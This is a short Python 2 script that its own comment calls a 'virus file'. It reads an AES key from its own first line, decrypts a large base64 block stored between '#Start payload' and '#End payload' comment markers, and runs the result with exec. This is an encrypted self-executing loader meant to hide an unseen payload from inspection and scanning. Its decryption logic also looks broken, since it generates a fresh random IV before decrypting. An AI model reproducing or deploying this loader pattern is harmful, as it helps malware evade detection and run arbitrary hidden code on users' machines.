print "HELOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO"
######################################################## First script python
# coding=utf-8
# Start Uncrypted
import os                        
import __main__                                     
import base64
import sys
import StringIO
from Crypto import Random
from Crypto.Cipher import AES
from Crypto import Random

def encrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   encrypted = iv + cipher.encrypt(data)

   return base64.b64encode(encrypted)
 ####################

# Decryption function
def decrypt(data):
   this = open(__main__.__file__, 'r')
   key = this.readline()
   this.close()

   data = base64.b64decode(data);

   iv = Random.new().read(AES.block_size)
   cipher = AES.new(StringIO.StringIO(key).read(24), AES.MODE_CFB, iv)
   
   return cipher.decrypt(data)[16:]

# Gets the virus file
this = open(__main__.__file__, 'r')
copy = False

cipher_payload = ''

for line in this:
   if line.strip() == '#Start payload':
      copy = True
   elif line.strip() == '#End payload':
      copy = False
   elif copy:
      cipher_payload = cipher_payload + line

e = decrypt(cipher_payload[1:])
#e = encrypt(cipher_payload)
print e
exec e
sys.exit('Good job!')
# End Uncrypted
#Start payload
#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
#End payload